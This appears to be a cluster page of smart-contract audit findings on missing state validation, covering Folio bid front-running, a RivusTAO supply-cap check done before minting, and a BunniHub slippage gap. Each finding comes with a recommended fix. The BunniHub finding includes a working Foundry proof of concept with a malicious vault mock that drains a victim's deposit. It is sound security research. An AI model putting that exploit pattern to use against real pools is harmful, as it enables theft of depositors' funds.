# Cluster -1209

**Rank:** #72  
**Count:** 235  

## Label
Insufficient state validation enables unauthorized state overwrites or double execution, leading to fund loss, inconsistent transitions, or unintended payments due to missing checks on existing states or values.

## Cluster Information
- **Total Findings:** 235

## Examples

### Example 1

**Auto Label:** Insufficient state validation and unauthorized state manipulation enable attackers to bypass critical checks, leading to unauthorized transfers, auction manipulation, or protocol devaluation.  

**Original Text Preview:**

The `Folio.bid()` function enforces that bids specify a strict `sellAmount` such that `minSellAmount == sellAmount == maxSellAmount`.

```solidity
function bid(
    //...
    uint256 sellAmount,
    //...
) external nonReentrant notDeprecated sync returns (uint256 boughtAmt) {
    Auction storage auction = auctions[auctionId];

    // checks auction is ongoing and that boughtAmt is below maxBuyAmount
    (, boughtAmt, ) = _getBid(
        --- SNIPPED ---
        sellAmount,             //> minSellAmount
        sellAmount,             //> maxSellAmount
        maxBuyAmount
    );

    --- SNIPPED ---
}
```

The available sell balance is checked at execution time in `RebalanceLib::getBid()`:

```solidity
require(sellAvailable >= params.minSellAmount, IFolio.Folio__InsufficientSellAvailable());
```

This creates a scenario where any change to the protocol balance state between bid creation and execution can cause bids to revert, which can occur through:

1. Other bids: Each successful bid could reduce the `sellToken` balance.
2. Redemptions: These affect both the `sellToken` balance and the `sellLimitBal` calculation, as calculated below:
   ```solidity
    uint256 sellLimitBal = Math.mulDiv(sellLimit, params.totalSupply, D27, Math.Rounding.Ceil);
    uint256 sellAvailable = params.sellBal > sellLimitBal ? params.sellBal - sellLimitBal : 0;
   ```

This issue can be exploited through front-running or can occur naturally through normal protocol usage, blocking bids from executing.
As auction prices decay over time, the protocol could miss favorable execution opportunities.

**Consider the following scenario**:

#### Initial state

0. `totalSupply()` 1000 shares, rebalance targeting reduction from 1000 ETH to 500 ETH, and buy 1,500,000 USDT:

   - 1 BU now consist of 1 ETH 0 USDT.
   - 1 BU traget to consist of 0.5 ETH, 1500 USDT.

1. User A submits a transaction for a full bid: 500 ETH → 1,500,000 USDT at start price (most favorable price).
2. User B front-runs with a minimal bid: 0.0003333 ETH → 1 USDT.
3. The sell token balance decreases to 999.9996667 ETH.
4. The `sellAvailable` becomes 499.9996667 ETH (999.9996667 - 500 ETH).
5. When User A's transaction executes, the check `499.9996667 >= 500` fails.
6. User A's bid reverts, and the protocol loses the opportunity to execute a large bid at a favorable price.

**Recommendation**

Allow a range for `sellAmount` by accepting bids with different `minSellAmount` and `maxSellAmount` values via `Folio.bid()`, allow to fill as much as is available within the range at execution time.

Or, prevent griefing by either freezing `redeem()` during active auctions, or introducing a redemption fee during auctions to disincentivize such attacks.

---
### Example 2

**Auto Label:** Inconsistent state validation and incomplete access controls enable attackers to manipulate token balances, bypass safeguards, or extract funds—leading to fund loss, supply overruns, or systemic risk.  

**Original Text Preview:**

The `cap` variable is intended to limit the total supply of `rsTAO` and `rsCOMAI`, and is checked in the `wrap()` function to ensure that the total minted does not exceed this cap:

```solidity
File: RivusTAO.sol
887:   function wrap(uint256 wtaoAmount) public nonReentrant checkPaused returns (uint256) {
...
...
894:     require(
895:       cap >= totalRsTAOMinted,
896:       "Deposit amount exceeds maximum"
897:     );
...
...
```

However, the current implementation allows the `cap` to be exceeded under certain conditions. Consider the following scenario:

1. The `cap` is set to `10` and `totalRsTAOMinted` is `9`.
2. A user performs a `wrap()` operation that would mint `30 rsTAO`, resulting in `totalRsTAOMinted` becoming `39`, thereby exceeding the `cap` of `10`.

This can happen because the `cap` check is performed before the new `rsTAO` is minted and added to the `totalRsTAOMinted`.

It is advisable to adjust the validation logic to include the amount of `rsTAO` to be minted in the cap check. This can be done by moving the cap check to after the calculation of `rsTAO` to be minted. This ensures the cap is not exceeded after new tokens are minted:

```diff
  function wrap(uint256 wtaoAmount) public nonReentrant checkPaused returns (uint256) {
    ...
    ...
--  require(
--    cap >= totalRsTAOMinted,
--    "Deposit amount exceeds maximum"
--  );
    ...
    ...
    uint256 rsTAOAmount = getRsTAObyWTAO(wrapAmountAfterFee);

    // Perform token transfers
    _mintRsTAO(msg.sender, rsTAOAmount);
++  require(
++    cap >= totalRsTAOMinted,
++    "Deposit amount exceeds maximum"
++  );
    ...
    ...
  }
```

---
### Example 3

**Auto Label:** Improper state validation enables attackers to steal referral scores, extract value via manipulated token balances, or misrepresent reserves—leading to unauthorized asset transfers or financial loss.  

**Original Text Preview:**

**Description:** `BunniHub::deposit` current implements slippage protection by allowing the caller to provide a minimum amount of each token to be used:

```solidity
function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
    external
    returns (uint256 shares, uint256 amount0, uint256 amount1)
{
    ...
    // check slippage
    if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
        revert BunniHub__SlippageTooHigh();
    }
    ...
}
```

This check ensures that there is not a significant change in the ratio of tokens from what the depositor expected; however, there is no check to ensure that the depositor receives an expected amount of shares for the given amounts of tokens. This validation is omitted from Uniswap because it is not possible to manipulate the total token amounts, but since Bunni can make use of external vaults for rehypothecation, it is possible for the balance of both tokens to change significantly from what the depositor expected. So long as the token ratio remains constant, value can be stolen from subsequent depositors if token balances are manipulated via the amounts deposited to vaults.

**Impact:** While users may receive fewer shares than expected, this is informational as it relies on a malicious vault implementation and as such users will not knowingly interact with a pool configured in this way.

**Proof of Concept:** Place this `MaliciousERC4626SlippageVault` inside `test/mocks/ERC4626Mock.sol` to simulate this malicious change in token balances:

```solidity
contract MaliciousERC4626SlippageVault is ERC4626 {
    address internal immutable _asset;
    uint256 internal multiplier = 1;

    constructor(IERC20 asset_) {
        _asset = address(asset_);
    }

    function setMultiplier(uint256 newMultiplier) public {
        multiplier = newMultiplier;
    }

    function previewRedeem(uint256 shares) public view override returns(uint256 assets){
        return super.previewRedeem(shares) * multiplier;
    }

    function deposit(uint256 assets, address to) public override returns(uint256 shares){
        multiplier = 1;
        return super.deposit(assets, to);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

The following test should be placed in `BunniHub.t.sol`:
```solidity
function test_SlippageAttack() public {
    ILiquidityDensityFunction uniformDistribution = new UniformDistribution(address(hub), address(bunniHook), address(quoter));
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    MaliciousERC4626SlippageVault maliciousVaultToken0 = new MaliciousERC4626SlippageVault(token0);
    MaliciousERC4626SlippageVault maliciousVaultToken1 = new MaliciousERC4626SlippageVault(token1);
    ERC4626 vault0_ = ERC4626(address(maliciousVaultToken0));
    ERC4626 vault1_ = ERC4626(address(maliciousVaultToken1));
    IBunniToken bunniToken;
    PoolKey memory key;
    (bunniToken, key) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: currency0,
            currency1: currency1,
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: uniformDistribution,
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.DYNAMIC_AND_STATEFUL,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING)),
            hooks: bunniHook,
            hookParams: abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            vault0: vault0_,
            vault1: vault1_,
            minRawTokenRatio0: 0.08e6,
            targetRawTokenRatio0: 0.1e6,
            maxRawTokenRatio0: 0.12e6,
            minRawTokenRatio1: 0.08e6,
            targetRawTokenRatio1: 0.1e6,
            maxRawTokenRatio1: 0.12e6,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(0),
            name: bytes32("BunniToken"),
            symbol: bytes32("BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(0)
        })
    );

    // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
    uint256 depositAmount0 = 1e18;
    uint256 depositAmount1 = 1e18;
    address firstDepositor = makeAddr("firstDepositor");
    vm.startPrank(firstDepositor);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, firstDepositor, depositAmount0 * 100);
    _mint(key.currency1, firstDepositor, depositAmount1 * 100);

    // deposit tokens
    IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: firstDepositor,
        refundRecipient: firstDepositor,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.startPrank(firstDepositor);
    (uint256 sharesFirstDepositor, uint256 firstDepositorAmount0In, uint256 firstDepositorAmount1In) = hub.deposit(depositParams);
    console.log("Amount 0 deposited by first depositor", firstDepositorAmount0In);
    console.log("Amount 1 deposited by first depositor", firstDepositorAmount1In);
    maliciousVaultToken0.setMultiplier(1e10);
    maliciousVaultToken1.setMultiplier(1e10);
    vm.stopPrank();


    depositAmount0 = 100e18;
    depositAmount1 = 100e18;
    address victim = makeAddr("victim");
    vm.startPrank(victim);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, victim, depositAmount0);
    _mint(key.currency1, victim, depositAmount1);

    // deposit tokens
    depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: depositAmount0 * 99 / 100,        // victim uses a slippage protection of 99%
        amount1Min: depositAmount0 * 99 / 100,        // victim uses a slippage protection of 99%
        deadline: block.timestamp,
        recipient: victim,
        refundRecipient: victim,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.prank(victim);
    (uint256 sharesVictim, uint256 victimAmount0In, uint256 victimAmount1In) = hub.deposit(depositParams);
    console.log("Amount 0 deposited by victim", victimAmount0In);
    console.log("Amount 1 deposited by victim", victimAmount1In);

    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: firstDepositor,
        shares: sharesFirstDepositor,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: false
    });
    vm.prank(firstDepositor);
    (uint256 withdrawAmount0FirstDepositor, uint256 withdrawAmount1FirstDepositor) = hub.withdraw(withdrawParams);
    console.log("Amount 0 withdrawn by first depositor", withdrawAmount0FirstDepositor);
    console.log("Amount 1 withdrawn by first depositor", withdrawAmount1FirstDepositor);

    withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: victim,
        shares: sharesVictim,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: false
    });
    vm.prank(victim);
    (uint256 withdrawAmount0Victim, uint256 withdrawAmount1Victim) = hub.withdraw(withdrawParams);
    console.log("Amount 0 withdrawn by victim", withdrawAmount0Victim);
    console.log("Amount 1 withdrawn by victim", withdrawAmount1Victim);
}
```

In this PoC, a `UniformDistribution` has been used to set the token ratio 1:1 to enable the token amounts to be seen more clearly. It can be observed that immediately before the victim deposits, the first depositor sets up a significant increase in the vault reserves such that the `BunniHub` believes it has many more reserves from both tokens. The `BunniHub` computes the amount of shares to mint for the victim considering these huge token balances. The result is that the victim receives a very small amount of shares. Afterwards, the attacker will be able to withdraw almost all the amounts deposited by the victim due to having far more shares.

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_SlippageAttack() (gas: 5990352)
Logs:
  Amount 0 deposited by first depositor     999999999999999999
  Amount 1 deposited by first depositor     999999999999999999
  Amount 0 deposited by victim           100000000000000000000
  Amount 1 deposited by victim           100000000000000000000
  Amount 0 withdrawn by first depositor  100999897877778912580
  Amount 1 withdrawn by first depositor  100999897877778912580
  Amount 0 withdrawn by victim                   1122222209640
  Amount 1 withdrawn by victim                   1122222209640

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 885.72ms (5.18ms CPU time)
```

**Recommended Mitigation:** Allow the depositor to provide a minimum amount of shares to mint when executing the deposit. As shown in the PoC, since the token ratio did not change, the slippage protection was not effective.

```diff
    struct DepositParams {
        PoolKey poolKey;
        address recipient;
        address refundRecipient;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
++      uint256 sharesMin;
        uint256 vaultFee0;
        uint256 vaultFee1;
        uint256 deadline;
        address referrer;
    }

    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        ...

--      // check slippage
--      if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
--          revert BunniHub__SlippageTooHigh();
--      }

        // mint shares using actual token amounts
        shares = _mintShares(
            msgSender,
            state.bunniToken,
            params.recipient,
            amount0,
            depositReturnData.balance0,
            amount1,
            depositReturnData.balance1,
            params.referrer
        );

++      // check slippage
++      if (amount0 < params.amount0Min || amount1 < params.amount1Min || shares < params.sharesMin) {
++          revert BunniHub__SlippageTooHigh();
++      }
        ...
    }
```

**Bacon Labs:** Acknowledged, we won’t make any changes since as the report suggests the user needs to knowingly deposit into a pool with a malicious vault which is out-of-scope.

**Cyfrin:** Acknowledged.

---
